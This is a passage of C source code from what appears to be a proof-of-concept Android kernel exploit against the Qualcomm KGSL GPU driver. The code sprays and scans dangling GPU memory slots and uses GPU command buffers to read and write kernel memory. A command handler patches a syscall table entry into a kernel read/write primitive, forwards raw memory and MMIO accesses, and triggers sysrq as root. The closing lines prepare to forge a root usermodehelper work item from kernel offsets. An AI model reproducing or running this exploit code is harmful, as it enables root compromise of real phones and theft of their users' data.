        L("[!] %s cache-clean errno=%d\n", tag, errno); return -1;
    }
    if (submit_ib(g, ib, len) != 0) {
        L("[!] %s submit errno=%d\n", tag, errno); return -1;
    }
    if (wait_submit_retire(g->ctx, last_submit_ts) != 0) {
        L("[!] %s wait errno=%d\n", tag, errno); return -1;
    }
    if (gpuobj_sync(dst_id, dst_off, 4, KGSL_GPUMEM_CACHE_INV) != 0) {
        L("[!] %s cache-inv errno=%d\n", tag, errno); return -1;
    }
    if (out) *out = *p;
    L("[D] %s src+0x%x -> 0x%08x\n", tag, src_off, *p);
    return 0;
}

/* Read-only hit detection.
   A hit means finding which dangling slot aliases one of our own memdesc entries. The original
   method blind-wrote a sentinel into the size field at +0x30 of every candidate slot and read
   it back: about 620k blind writes per pass, 99.4-99.75% of which land in another process's
   page. Instead, enumerate each sprayed entry's gpuaddr with the INFO ioctl, which needs no GPU
   work, and scan the slot's +0x20 read-only; a match gives id, page and slot directly, and with
   no GPU write there is no marker family left to corrupt anything.
   Geometry: 256 pages x 8 slots per batch, 18 words per slot. */
#define ROSCAN_BATCH_PAGES   256   /* 256x8x18 = 36864 words = 144 KiB, within the 512 KiB IB limit */
#define ROSCAN_MIN_BATCH_PAGES   8
#ifndef ROSCAN_WAIT_RETIRE
/* Retire wait on by default. Single-variable test, two back-to-back scans per round: with it off
   the two scans of one window disagreed in 5 rounds out of 6 and only 3-6% of decoded slots were
   nonzero; with it on, 6 of 6 agreed and the nonzero share was 48-61%. */
#define ROSCAN_WAIT_RETIRE 1
#endif
#define ROSCAN_BATCH_DELAY_MS 2    /* sleep once at the end of each batch. Two batch sizes share this
                                   delay: the hot path scans 256 pages per batch (halved on fault,
                                   floor 8), the blind-write control 1024. A full 65539-page pass
                                   costs ~0.5 s and ~0.13 s respectively. */
#define ROSCAN_DST_OFF     0x2000u
/* Three dwords per slot: memdesc.gpuaddr at +0x20/+0x24 and entry.id at +0x98.
   gpuaddr alone is not enough: KGSL_IOMMU_VA_BASE64 is a per-pagetable va_start and the
   allocator is per-pagetable lowest-first, so another kgsl client's memdesc inside the window
   lands in the same IOVA band as our contiguous 16 MB one and any aligned foreign IOVA there
   matches it. size and flags do not discriminate, since every 4 KB BMO is size=0x1000,
   flags=0xc0000. The old write-sentinel method was immune to that, at the price of 500k blind
   writes; requiring gpuaddr and id to match the same entry makes a collision implausible. Each
   slot takes 16 bytes in the destination (lo/hi/id/pad), 2048 x 16 = 32 KB. */
typedef struct { uint64_t gpa; uint32_t id; } scan_key_t;
static int scan_key_cmp(const void *a, const void *b)
{
    uint64_t x = ((const scan_key_t *)a)->gpa, y = ((const scan_key_t *)b)->gpa;
    return (x < y) ? -1 : (x > y) ? 1 : 0;
}
/* Returns the hit count and fills the hit_* arrays.
   The batch size adapts: on a fault it halves and retries the same range, since a read-only retry
   costs nothing and pollutes nothing, and not skipping the batch loses no coverage. */
static int scan_window_readonly(struct gpu_ctx_t *g, uint32_t dst_id, void *dst_u, uint64_t dst_g,
                    const uint32_t *spray_ids, int n_sprayed,
                    uint32_t *hit_ids, int *hit_pages, int *hit_slots,
                    int max_hits, int wlimit)
{
    static scan_key_t tab[69632];
    int n = 0, nh = 0, scanned = 0, faults = 0;
    int c_dg = 0, c_pipe = 0, c_kgsl = 0, c_zero = 0;
    int per_batch = ROSCAN_BATCH_PAGES;
    if (n_sprayed <= 0 || wlimit <= 1) return 0;
    for (int i = 0; i < n_sprayed; i++) {
        uint64_t gpa = 0;
        if (gpuobj_info(spray_ids[i], &gpa) != 0 || gpa == 0) continue;
        tab[n].gpa = gpa; tab[n].id = spray_ids[i]; n++;
    }
    qsort(tab, (size_t)n, sizeof(tab[0]), scan_key_cmp);
    L("[ROSCAN] gpuaddr+id table %d/%d (no GPU enumeration needed)\n", n, n_sprayed);
    log_fsync();
    if (n == 0) return 0;
    uint32_t *ib = malloc((ROSCAN_BATCH_PAGES * 8 * 18 + 64) * sizeof(uint32_t));
    if (!ib) { L("[!] ROSCAN IB malloc FAILED\n"); return 0; }
    for (int base = 1; base < wlimit && nh < max_hits; ) {
        int cnt = per_batch;
        if (base + cnt > wlimit) cnt = wlimit - base;
        int nslot = cnt * 8;
        uint32_t len = 0;
        len += cp_nop(&ib[len], 0x0);
        for (int k = 0; k < nslot; k++) {
            int j = k >> 3, slot = k & 7;
            uint64_t src = DANGLING_BASE + ((uint64_t)(base + j) << 12)
                         + (uint64_t)slot * 512;
            uint64_t d = dst_g + ROSCAN_DST_OFF + (uint64_t)k * 16;
            len += cp_mem_to_mem(&ib[len], src + 0x20, d);        /* gpuaddr lo */
            len += cp_mem_to_mem(&ib[len], src + 0x24, d + 4);    /* gpuaddr hi */
            len += cp_mem_to_mem(&ib[len], src + 0x98, d + 8);    /* entry.id   */
        }
        len += cp_wait_mem_writes(&ib[len]);
        len += cp_nop(&ib[len], 0x0);
        volatile uint32_t *pv = (volatile uint32_t *)((char *)dst_u + ROSCAN_DST_OFF);
        for (int k = 0; k < nslot * 4; k++) pv[k] = 0;
        uint64_t dlen = (uint64_t)nslot * 16;
        if (gpuobj_sync(dst_id, ROSCAN_DST_OFF, dlen, KGSL_GPUMEM_CACHE_CLEAN) != 0) break;
        WD_START(20);
        int r = submit_ib(g, ib, len);
        WD_STOP();
        if (r != 0) {
            faults++;
            if (per_batch <= ROSCAN_MIN_BATCH_PAGES) {
                L("[!] ROSCAN batch fault errno=%d pg=%d (batch already minimal); skipping batch\n", errno, base);
                log_fsync();
                if (rebuild_ctx(g) != 0) break;
                base += cnt;
                continue;
            }
            per_batch /= 2;
            L("[!] ROSCAN batch fault errno=%d pg=%d; halving batch to %d and retrying the same range\n",
              errno, base, per_batch);
            log_fsync();
            if (rebuild_ctx(g) != 0) break;
            continue;
        }
        /* Every other readback path waits for retire - gpu_read_one, gpu_read_one_m2m,
           gpu_read_memdesc, SLIDETEST - so skipping it here races the CPU against the GPU,
           losing hits or decoding values left over from the previous batch as a wrong page. */
        /* The suspect behind the switch: with 256+ batches per pass the retire waits stack RSC
         * completions and may interfere with the RPMh voting path. */
        if (ROSCAN_WAIT_RETIRE) {
            if (wait_submit_retire(g->ctx, last_submit_ts) != 0) {
                L("[!] ROSCAN retire failed errno=%d pg=%d\n", errno, base);
                log_fsync();
                if (rebuild_ctx(g) != 0) break;
                continue;
            }
        }
        if (gpuobj_sync(dst_id, ROSCAN_DST_OFF, dlen, KGSL_GPUMEM_CACHE_INV) != 0) break;
        for (int k = 0; k < nslot && nh < max_hits; k++) {
            uint32_t lo = pv[k * 4], hi = pv[k * 4 + 1], idv = pv[k * 4 + 2];
            /* Read-only census. Which filler owns the window decides the fix: the
               pressure payloads mean the pressure is the thief, a foreign kgsl
               memdesc means the window was recycled but too late, zeros mean the
               frames were never reused at all. */
            if (lo == 0x53535353u && hi == 0x53535353u) { c_dg++; continue; }
            if (lo == 0x50505050u && hi == 0x50505050u) { c_pipe++; continue; }
            if (lo == 0 && hi == 0) { c_zero++; continue; }
            if (idv == 0) continue;
            scan_key_t key; key.gpa = ((uint64_t)hi << 32) | lo; key.id = idv;
            scan_key_t *h = bsearch(&key, tab, (size_t)n, sizeof(tab[0]), scan_key_cmp);
            if (!h || h->id != idv) {
                /* A memdesc in our IOVA band that is not in the spray table. Counting
                   before the lookup would count our own hits, which is what the first
                   version of this census did. */
                if (hi == 0x40u && idv != 0) c_kgsl++;
                continue;
            }
            int j = k >> 3, slot = k & 7;
            hit_ids[nh] = h->id; hit_pages[nh] = base + j; hit_slots[nh] = slot;
            if (nh < 3)
                L("[+] ROSCAN hit entry id=%u: page=%d slot=%d (gpa=%08x%08x id@0x98=%u)\n",
                  h->id, base + j, slot, hi, lo, idv);
            nh++;
        }
        scanned += cnt;
        base += cnt;
        usleep(ROSCAN_BATCH_DELAY_MS * 1000);
    }
    free(ib);
    L("[ROSCAN] scanned %d pages -> %d hits (zero window writes, %d faults, last batch %d pages)\n",
      scanned, nh, faults, per_batch);
    L("[ROSCAN] census: dgram=%d pipe=%d kgsl=%d zero=%d\n", c_dg, c_pipe, c_kgsl, c_zero);
    log_fsync();
    return nh;
}

/* A/B control: the pre-read-only full-window blind write.
   Isolates corruption as the single variable: same binary, same hit detection, the only
   difference is whether a sentinel is written to +0x30 of every candidate slot first.
   Hypothesis: those blind writes corrupt DRAM structures the driver holds, so switching the USB
   mode to MTP lands an RPMh vote on a bad address, the accelerator stops responding and the CPU
   stalls. If the control crashes where the default survives, that is the causal evidence.
   Enable it with the LEGACY_BLIND_WRITE=1 environment variable. */
static void legacy_blind_write(struct gpu_ctx_t *g, int wlimit)
{
    const int PER = 1024;
    uint32_t *ib = malloc((PER * 8 + 16) * sizeof(uint32_t));
    if (!ib) { L("[BLIND-WRITE] IB malloc FAILED\n"); return; }
    L("[BLIND-WRITE] full-window blind write reproducing the pre-ROSCAN state (slot-0-only, +0x30, window=%d pages)\n", wlimit);
    log_fsync();
    for (int base = 1; base < wlimit; base += PER) {
        int cnt = PER;
        if (base + cnt > wlimit) cnt = wlimit - base;
        uint32_t len = 0;
        len += cp_nop(&ib[len], 0x0);
        for (int j = 0; j < cnt; j++)
            len += cp_mem_write(&ib[len],
                DANGLING_BASE + ((uint64_t)(base + j) << 12) + 0x30,
                0x5A5A0000u + (((uint32_t)(base + j)) << 4));
        len += cp_wait_mem_writes(&ib[len]);
        len += cp_nop(&ib[len], 0x0);
        WD_START(20);
        int r = submit_ib(g, ib, len);
        WD_STOP();
        if (r != 0) {
            L("[BLIND-WRITE] batch fault errno=%d pg=%d; skipping batch\n", errno, base);
            log_fsync();
            if (rebuild_ctx(g) != 0) break;
            continue;
        }
        usleep(ROSCAN_BATCH_DELAY_MS * 1000);
    }
    free(ib);
    L("[BLIND-WRITE] blind write complete (corruption reproduced)\n");
    log_fsync();
}

/* GPU canary.
   Write, retire and compare the content in one step: retiring is not proof on its own, because
   the kernel can advance the memstore timestamp by writing it directly from the CPU. Run this
   before every critical write. */
static struct { struct gpu_ctx_t g; uint32_t id; void *u; uint64_t gpa; int init; } g_can;
static uint32_t g_can_seq;
static int canary_init(void)
{
    if (g_can.init) return 0;
    if (setup_ib(&g_can.g) != 0) return -1;
    if (gpuobj_alloc(0x1000, 0, &g_can.id) != 0 || g_can.id == 0) return -1;
    g_can.u = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED,
        kgsl_fd, ((off_t)g_can.id) << 12);
    if (g_can.u == MAP_FAILED) { g_can.u = NULL; return -1; }
    if (gpuobj_info(g_can.id, &g_can.gpa) != 0 || g_can.gpa == 0) return -1;
    g_can.init = 1;
    return 0;
}
static int canary_ok(int tmo_ms)
{
    (void)tmo_ms;
    if (canary_init() != 0) return 0;
    uint32_t ib[16], len = 0;
    uint32_t nonce = 0xC0FFEE00u ^ ++g_can_seq;
    len += cp_nop(&ib[len], 0x0);
    len += cp_mem_write(&ib[len], g_can.gpa + 0x40, nonce);
    len += cp_wait_mem_writes(&ib[len]);
    len += cp_nop(&ib[len], 0x0);
    volatile uint32_t *p = (volatile uint32_t *)((char *)g_can.u + 0x40);
    *p = 0xDEADBEEFu;
    if (gpuobj_sync(g_can.id, 0x40, 4, KGSL_GPUMEM_CACHE_CLEAN) != 0) return 0;
    WD_START(5);
    int r = submit_ib(&g_can.g, ib, len);
    WD_STOP();
    if (r != 0) return 0;
    if (wait_submit_retire(g_can.g.ctx, last_submit_ts) != 0) return 0;
    if (gpuobj_sync(g_can.id, 0x40, 4, KGSL_GPUMEM_CACHE_INV) != 0) return 0;
    return *p == nonce;   /* content match: the command really ran */
}

static int gpu_write_words(struct gpu_ctx_t *g, uint64_t ep,
    const uint64_t *offs, const uint32_t *vals, int n,
    const char *tag)
{
    uint32_t ib[8 + 16 * 6 + 8], len = 0;
    if (n > 16) return -1;
    len += cp_nop(&ib[len], 0x0);
    for (int k = 0; k < n; k++)
        len += cp_mem_write(&ib[len], ep + offs[k], vals[k]);
    len += cp_wait_mem_writes(&ib[len]);
    len += cp_nop(&ib[len], 0x0);
    WD_START(20);
    int r = submit_ib(g, ib, len);
    WD_STOP();
    if (r != 0) { L("[!] %s submit fault errno=%d\n", tag, errno); return -1; }
    /* submit_ib only proves the command buffer was accepted. Wait for this thread's
       own timestamp, or a heal reports success while the write is still queued. */
    if (wait_submit_retire(g->ctx, last_submit_ts) != 0) {
        L("[!] %s retire failed errno=%d\n", tag, errno);
        return -1;
    }
    return 0;
}


/* Graceful release commands.
   Heal and free need only a duplicate kgsl fd and GPU submissions, never the load balancer, so
   the forked server can serve them. Heal strictly before free; a failure leaves the current
   state. */
static void rel_handle(const char *line)
{
    static struct gpu_ctx_t rg;
    g_rel_durable_pid = getpid();   /* pressure is over; the release records must survive a reset */
#if !V7_ENABLE_RELEASE_EXIT
    /* Compiled out by default: this verb drops the last fd holder and runs the
       teardown. Build with -DV7_ENABLE_RELEASE_EXIT=1 when the point of the run is
       to study that. */
    if (!strncmp(line, "RELEASE_EXIT", 12)) {
        rputs(1, "[REL] disabled in this build (V7_ENABLE_RELEASE_EXIT=0)\n");
        return;
    }
#endif
    if (!strncmp(line, "RELEASE_DUMP", 12)) {
        int nh = g_rel_nh, ns = g_rel_nsprayed;
        FILE *fe = fopen("/data/local/tmp/rel_eps.txt", "w");
        FILE *fv = fopen("/data/local/tmp/rel_victim.txt", "w");
        FILE *ff = fopen("/data/local/tmp/rel_free.txt", "w");
        int wep = 0;
        if (fe) for (int i = 0; i < nh; i++) {
            uint64_t ep = DANGLING_BASE + ((uint64_t)g_rel_hit_pages[i] << 12)
                + (uint64_t)g_rel_hit_slots[i] * 512;
            fprintf(fe, "%llu\n", (unsigned long long)ep); wep++;
        }
        if (fe) { fflush(fe); safe_fsync(fileno(fe)); fclose(fe); }
        if (fv) { fprintf(fv, "%llu\n%llu\n",
                (unsigned long long)g_rel_victim_ep,
                (unsigned long long)g_pool_ops_rt);
            fflush(fv); safe_fsync(fileno(fv)); fclose(fv); }
        int wf = 0;
        if (ff) { for (int i = 0; i < ns; i++)
                if (g_rel_spray_ids[i]) { fprintf(ff, "%u\n", g_rel_spray_ids[i]); wf++; }
            if (g_can.id) { fprintf(ff, "%u\n", g_can.id); wf++; }
            if (g_place_id) { fprintf(ff, "%u\n", g_place_id); wf++; }
            if (g_rel_victim_id) { fprintf(ff, "%u\n", g_rel_victim_id); wf++; }
            fflush(ff); safe_fsync(fileno(ff)); fclose(ff); }
        char m4[64]; snprintf(m4, sizeof(m4),
            "[REL] DUMP eps=%d victim=0x%llx free=%d\n", wep,
            (unsigned long long)g_rel_victim_ep, wf);
        rputs(1, m4);
        return;
    }
    if (!strncmp(line, "RELEASE_HEAL_HITS", 17)) {
        static uint64_t eps[8192];
        g_heal_hits_done = 0;   /* a stale success must not gate a later attempt */
        int n = gf_read_u64s("/data/local/tmp/rel_eps.txt", eps, 8192);
        if (n <= 0) { rputs(1, "[REL] no eps file\n"); return; }
        if (!rg.ctx && setup_ib(&rg) != 0) { rputs(1, "[REL] ctx FAILED\n"); return; }
        int okc = 0;
        for (int i = 0; i < n; i++) {
            uint64_t of[2] = {0x30, 0x34}; uint32_t va[2] = {0x1000u, 0u};
            if (gpu_write_words(&rg, eps[i], of, va, 2, "HEAL") != 0) break;   /* the gate needs all n */
            okc++;
        }
        char m2[64]; snprintf(m2, sizeof(m2), "[REL] HEAL_HITS %d/%d\n", okc, n);
        rputs(1, m2);
        g_heal_hits_done = (okc == n);
        return;
    }
    if (!strncmp(line, "RELEASE_HEAL_VICTIM", 19)) {
        g_heal_victim_done = 0;
        /* rel_victim.txt: line 1 is the victim entry pointer, line 2 the runtime pool_ops address. */
        uint64_t ve[2];
        if (gf_read_u64s("/data/local/tmp/rel_victim.txt", ve, 2) != 2)
            { rputs(1, "[REL] victim file bad\n"); return; }
        if (!rg.ctx && setup_ib(&rg) != 0) { rputs(1, "[REL] ctx2 FAILED\n"); return; }
        uint64_t of[6] = {0x30, 0x34, 0x28, 0x2c, 0x48, 0x4c};
        uint32_t va[6];
        va[0] = 0x1000u; va[1] = 0u;
        va[2] = 0u;      va[3] = 0u;                       /* physaddr -> 0 */
        va[4] = (uint32_t)ve[1]; va[5] = (uint32_t)(ve[1] >> 32);
        if (gpu_write_words(&rg, ve[0], of, va, 6, "HVICT") != 0)
            { rputs(1, "[REL] HVICT write fail\n"); return; }
        g_heal_victim_done = 1;
        rputs(1, "[REL] HEAL_VICTIM wrote\n");
        return;
    }
    if (!strncmp(line, "RELEASE_FREE", 12)) {
        if (!(g_heal_hits_done && g_heal_victim_done) && !env_on("REL_FORCE"))
            { rputs(1, "[REL] FREE blocked: heal incomplete\n"); return; }
        /* Optional [start] [count]; without them the whole list is freed. */
        static uint64_t ids[75000];
        int n = gf_read_u64s("/data/local/tmp/rel_free.txt", ids, 75000);
        if (n <= 0) { rputs(1, "[REL] no free list\n"); return; }
        int st = 0, ct = n;
        { const char *q = line + 12;
          while (*q == ' ') q++;
          if (*q >= '0' && *q <= '9') { st = atoi(q);
            while (*q >= '0' && *q <= '9') q++;
            while (*q == ' ') q++;
            if (*q >= '0' && *q <= '9') ct = atoi(q); } }
        if (st < 0) st = 0;
        if (st > n) st = n;
        if (ct > n - st) ct = n - st;
        int okc = 0;
        for (int i = st; i < st + ct; i++)
            if (gpuobj_free((uint32_t)ids[i]) == 0) okc++;
        char m3[64]; snprintf(m3, sizeof(m3), "[REL] FREE %d/%d (st=%d n=%d)\n",
            okc, ct, st, n);
        rputs(1, m3);
        /* One failure is expected: the victim id was freed earlier and returns -ENOENT.
           The caller decides what to do with a short batch; the verb only reports it. */
        return;
    }
    /* RELEASE_KILLFAM: kill every process carrying this executable except this
       server and main. After a successful run the family is hundreds of parked
       children and they all hold the kgsl fd, so freeing the GPU objects does not
       return the fd count to one until they are gone. Main stays as the single
       holder; the teardown is the caller's decision, through RELEASE_EXIT once it
       is the last one. */
    if (!strncmp(line, "RELEASE_KILLFAM", 15)) {
        int me = (int)getpid(), main_pid = 0, killed = 0, left = 0;
        char self_exe[256]; self_exe[0] = 0;
        { ssize_t sn = readlink("/proc/self/exe", self_exe, sizeof self_exe - 1);
          if (sn > 0) self_exe[sn] = 0; }
        { FILE *f = fopen("/data/local/tmp/poc.lock", "r");
          if (f) { if (fscanf(f, "%d", &main_pid) != 1) main_pid = 0; fclose(f); } }
        /* Without main's pid this cannot tell main from a child, and killing main
           here would drop the fd count to one by accident. Refuse. */
        if (main_pid <= 1) {
            rputs(1, "[REL] KILLFAM refused: no main pid in the lock\n");
            log_fsync();
            return;
        }
        for (int pass = 0; pass < 4; pass++) {
            int k = 0;
            DIR *d = opendir("/proc");
            struct dirent *de;
            while (d && (de = readdir(d))) {
                if (de->d_name[0] < '0' || de->d_name[0] > '9') continue;
                int pid = atoi(de->d_name);
                if (pid <= 1 || pid == me || pid == main_pid) continue;
                if (!pid_is_family(pid, self_exe)) continue;
                if (kill(pid, SIGKILL) == 0) k++;
            }
            if (d) closedir(d);
            killed += k;
            if (!k) break;
            usleep(50 * 1000);
        }
        { DIR *d = opendir("/proc");
          struct dirent *de;
          while (d && (de = readdir(d))) {
              if (de->d_name[0] < '0' || de->d_name[0] > '9') continue;
              int pid = atoi(de->d_name);
              if (pid <= 1 || pid == me || pid == main_pid) continue;
              if (pid_is_family(pid, self_exe)) left++;
          }
          if (d) closedir(d); }
        char m5[96];
        snprintf(m5, sizeof(m5), "[REL] KILLFAM killed=%d left=%d (main=%d me=%d)\n",
                 killed, left, main_pid, me);
        rputs(1, m5);
        log_fsync();
        return;
    }
    if (!strncmp(line, "RELEASE_DONE", 12)) {
        rputs(1, "[REL] server exit\n");
        log_fsync();
        syscall(SYS_exit_group, 0);
        return;
    }
    /* RELEASE_EXIT: drop the last fd holder and run the teardown. The heal and free
       verbs have to have completed first; an unhealed entry wedges the teardown. */
    if (!strncmp(line, "RELEASE_EXIT", 12)) {
        rputs(1, "[REL] EXIT: server exiting as last fd holder -> kgsl_release -> teardown\n");
        log_fsync();
        syscall(SYS_exit_group, 0);
        return;
    }
    /* RELEASE_KRINSTALL <sys_call_table_va> <nr> <target_va>: turn syscall nr
       into a kernel read/write primitive by pointing its stub at __arch_copy_to_user /
       __arch_copy_from_user. The server has no window of its own (lb is VM_DONTCOPY),
       so this is parsed here and forwarded to main. */
    if (!strncmp(line, "RELEASE_KRINSTALL", 17)) {
        char *q = (char *)line + 17;
        while (*q == ' ') q++;
        uint64_t tbl = strtoull(q, &q, 16);
        while (*q == ' ') q++;
        int nr = (int)strtoul(q, &q, 10);
        while (*q == ' ') q++;
        uint64_t tgt = strtoull(q, &q, 16);
        char cmd[160];
        snprintf(cmd, sizeof cmd, "KRINSTALL %llx %d %llx",
                 (unsigned long long)tbl, nr, (unsigned long long)tgt);
        { int w = open("/data/local/tmp/wdcmd", O_WRONLY | O_APPEND | O_CREAT, 0666);
          if (w >= 0) { ssize_t wr = write(w, cmd, strlen(cmd)); (void)wr;
                        wr = write(w, "\n", 1); (void)wr; close(w); } }
        rputs(1, "[KRINSTALL] forwarded to main (wdcmd)\n");
        return;
    }
    if (!strncmp(line, "RELEASE_DRAMLOOP", 16)) {
        const char *body = line + 8;
        char cmd[320];
        snprintf(cmd, sizeof cmd, "%s", body);
        { int w = open("/data/local/tmp/wdcmd", O_WRONLY | O_APPEND | O_CREAT, 0666);
          if (w >= 0) { ssize_t wr = write(w, cmd, strlen(cmd)); (void)wr;
                        wr = write(w, "\n", 1); (void)wr; close(w); } }
        rputs(1, "[DRAMLOOP] forwarded to main (wdcmd)\n");
        return;
    }
    if (!strncmp(line, "RELEASE_RSCRN", 13)) {
        const char *body = line + 8;
        char cmd[320];
        snprintf(cmd, sizeof cmd, "%s", body);
        { int w = open("/data/local/tmp/wdcmd", O_WRONLY | O_APPEND | O_CREAT, 0666);
          if (w >= 0) { ssize_t wr = write(w, cmd, strlen(cmd)); (void)wr;
                        wr = write(w, "\n", 1); (void)wr; close(w); } }
        rputs(1, "[wdcmd] run-release forwarded to main\n");
        return;
    }
    if (!strncmp(line, "RELEASE_RSCLOOP", 15)) {
        const char *body = line + 8;
        char cmd[320];
        snprintf(cmd, sizeof cmd, "%s", body);
        { int w = open("/data/local/tmp/wdcmd", O_WRONLY | O_APPEND | O_CREAT, 0666);
          if (w >= 0) { ssize_t wr = write(w, cmd, strlen(cmd)); (void)wr;
                        wr = write(w, "\n", 1); (void)wr; close(w); } }
        rputs(1, "[RSCLOOP] forwarded to main (wdcmd)\n");
        return;
    }
    if (!strncmp(line, "RELEASE_RSCFX", 13)) {
        const char *body = line + 8;
        char cmd[320];
        snprintf(cmd, sizeof cmd, "%s", body);
        { int w = open("/data/local/tmp/wdcmd", O_WRONLY | O_APPEND | O_CREAT, 0666);
          if (w >= 0) { ssize_t wr = write(w, cmd, strlen(cmd)); (void)wr;
                        wr = write(w, "\n", 1); (void)wr; close(w); } }
        rputs(1, "[wdcmd] fix-release forwarded to main\n");
        return;
    }
    if (!strncmp(line, "RELEASE_MEMIORD", 15)) {
        const char *body = line + 8;
        char cmd[384];
        snprintf(cmd, sizeof cmd, "%s", body);
        { int w = open("/data/local/tmp/wdcmd", O_WRONLY | O_APPEND | O_CREAT, 0666);
          if (w >= 0) { ssize_t wr = write(w, cmd, strlen(cmd)); (void)wr;
                        wr = write(w, "\n", 1); (void)wr; close(w); } }
        rputs(1, "[MEMIORD] forwarded to main (wdcmd)\n");
        return;
    }
    if (!strncmp(line, "RELEASE_MEMREAD", 15) || !strncmp(line, "RELEASE_MEMWRITE", 16)) {
        const char *body = line + 8;
        char cmd[512];
        snprintf(cmd, sizeof cmd, "%s", body);
        { int w = open("/data/local/tmp/wdcmd", O_WRONLY | O_APPEND | O_CREAT, 0666);
          if (w >= 0) { ssize_t wr = write(w, cmd, strlen(cmd)); (void)wr;
                        wr = write(w, "\n", 1); (void)wr; close(w); } }
        rputs(1, "[MEM] forwarded to main (wdcmd)\n");
        return;
    }
    if (!strncmp(line, "RELEASE_RSCDUMP", 15)) {
        const char *body = line + 8;
        char cmd[320];
        snprintf(cmd, sizeof cmd, "%s", body);
        { int w = open("/data/local/tmp/wdcmd", O_WRONLY | O_APPEND | O_CREAT, 0666);
          if (w >= 0) { ssize_t wr = write(w, cmd, strlen(cmd)); (void)wr;
                        wr = write(w, "\n", 1); (void)wr; close(w); } }
        rputs(1, "[RSCDUMP] forwarded to main (wdcmd)\n");
        return;
    }
    if (!strncmp(line, "RELEASE_MMIOR2", 14)) {
        const char *body = line + 8;
        char cmd[256];
        snprintf(cmd, sizeof cmd, "%s", body);
        { int w = open("/data/local/tmp/wdcmd", O_WRONLY | O_APPEND | O_CREAT, 0666);
          if (w >= 0) { ssize_t wr = write(w, cmd, strlen(cmd)); (void)wr;
                        wr = write(w, "\n", 1); (void)wr; close(w); } }
        rputs(1, "[MMIOR2] forwarded to main (wdcmd)\n");
        return;
    }
    if (!strncmp(line, "RELEASE_KRFWD", 13)) {
        const char *body = line + 8;
        char cmd[192];
        snprintf(cmd, sizeof cmd, "%s", body);
        { int w = open("/data/local/tmp/wdcmd", O_WRONLY | O_APPEND | O_CREAT, 0666);
          if (w >= 0) { ssize_t wr = write(w, cmd, strlen(cmd)); (void)wr;
                        wr = write(w, "\n", 1); (void)wr; close(w); } }
        rputs(1, "[KRFWD] forwarded to main (wdcmd)\n");
        return;
    }
    if (!strncmp(line, "RELEASE_MMIOR", 13) || !strncmp(line, "RELEASE_MMIOW", 13)) {
        const char *body = line + 8;
        char cmd[192];
        snprintf(cmd, sizeof cmd, "%s", body);
        { int w = open("/data/local/tmp/wdcmd", O_WRONLY | O_APPEND | O_CREAT, 0666);
          if (w >= 0) { ssize_t wr = write(w, cmd, strlen(cmd)); (void)wr;
                        wr = write(w, "\n", 1); (void)wr; close(w); } }
        rputs(1, "[MMIO] forwarded to main (wdcmd)\n");
        return;
    }
    /* RELEASE_KREAD <nr> <va_hex> <n> / RELEASE_KWRITE <nr> <va_hex> <hex...>:
       main has to issue the patched syscall itself. */
    if (!strncmp(line, "RELEASE_KREAD", 13) || !strncmp(line, "RELEASE_KWRITE", 14)) {
        const char *body = line + 8;
        char cmd[512];
        snprintf(cmd, sizeof cmd, "%s", body);
        { int w = open("/data/local/tmp/wdcmd", O_WRONLY | O_APPEND | O_CREAT, 0666);
          if (w >= 0) { ssize_t wr = write(w, cmd, strlen(cmd)); (void)wr;
                        wr = write(w, "\n", 1); (void)wr; close(w); } }
        rputs(1, "[KR] forwarded to main (wdcmd)\n");
        return;
    }
    /* RELEASE_SYSRQ <sec>: after N seconds write 't' to /proc/sysrq-trigger as root,
       dumping every task's stack from another CPU. It goes to dmesg, so RELEASE_CAPLOG
       has to be running for the dump to outlive a reset. */
    if (!strncmp(line, "RELEASE_SYSRQ", 13)) {
        int sec = 4;
        { const char *q = line + 13; while (*q == ' ') q++;
          if (*q >= '0' && *q <= '9') sec = atoi(q); }
        if (sec < 1) sec = 1;
        if (sec > 30) sec = 30;
        pid_t p = fork();
        if (p == 0) {
            sleep((unsigned)sec);
            int sf = open("/proc/sysrq-trigger", O_WRONLY);
            if (sf >= 0) { ssize_t wr = write(sf, "t", 1); (void)wr; close(sf); }
            _exit(0);
        }
        { char t2[64]; snprintf(t2, sizeof t2, "[SYSRQ] armed in %ds (pid=%d)\n", sec, (int)p);
          rputs(1, t2); }
        log_fsync();
        return;
    }
    /* RELEASE_CAPLOG: copy the kernel log to /data/local/tmp/cap.out as root for as long
       as the process lives. There is no pstore, so a reader that is still running when the
       hang lands is the only record:
        - open /dev/kmsg once and read it continuously, so no record falls between polls
        - fsync every 8 records: the bark and the stacks have to reach disk before a reset
        - reopen when the read fails (ring cleared, EPIPE) */
    if (!strncmp(line, "RELEASE_CAPLOG", 14)) {
        pid_t p = fork();
        if (p == 0) {
            int of = open("/data/local/tmp/cap.out",
                          O_WRONLY | O_CREAT | O_APPEND, 0666);
            if (of < 0) _exit(1);
            for (;;) {
                int kf = open("/dev/kmsg", O_RDONLY);
                if (kf < 0) { usleep(100 * 1000); continue; }
                int nrec = 0;
                for (;;) {
                    char b[2048];
                    ssize_t r = read(kf, b, sizeof b - 1);
                    if (r <= 0) break;              /* EPIPE or ring cleared: reopen */
                    ssize_t wr = write(of, b, (size_t)r);
                    if (wr < 0) break;
                    if (++nrec >= 8) { nrec = 0; safe_fsync(of); }
                }
                close(kf);
                usleep(50 * 1000);
            }
        }
        { char t2[64]; snprintf(t2, sizeof t2, "[CAP] logger pid=%d\n", (int)p);
          rputs(1, t2); }
        log_fsync();
        return;
    }
    rputs(1, "[REL] unknown cmd\n");
}

/* Forge a root usermodehelper work item out of plain data. The offsets come from a
   pahole dump of the kernel image. Globals used below: g_lb (the window), g_M, g_kvo
   (kimage_voffset) and g_img_pa (image PA). Conversions used throughout:
     linear map PA = VA - LIN_PAGE_OFF + g_M;  VA = PA + LIN_PAGE_OFF - g_M
     exec alias VA = PA + g_kvo;  image field PA = g_img_pa + off */
#define WIN_PA_BASE   0x80000000ULL
#define LIN_PAGE_OFF 0xffffff8000000000ULL
#define FORGE_RETVAL_SENTINEL     0x7FFF7FFFu
        #define OFF_SYSTEM_UNBOUND_WQ    0x298f718ULL     /* system_unbound_wq pointer */
#define OFF_UMH_EXEC_WORK_JT    0x14ae160ULL     /* call_usermodehelper_exec_work.cfi_jt */
#define OFF_UMH_DISABLED   0x2a87630ULL     /* usermodehelper_disabled */
static volatile uint64_t *win_ptr(uint64_t pa) {
    return (volatile uint64_t *)(g_lb + (pa - WIN_PA_BASE));
}
static uint64_t lin_va_to_pa(uint64_t va)     { return va - LIN_PAGE_OFF + g_M; }
static uint64_t pa_to_lin_va(uint64_t pa)  { return pa + LIN_PAGE_OFF - g_M; }
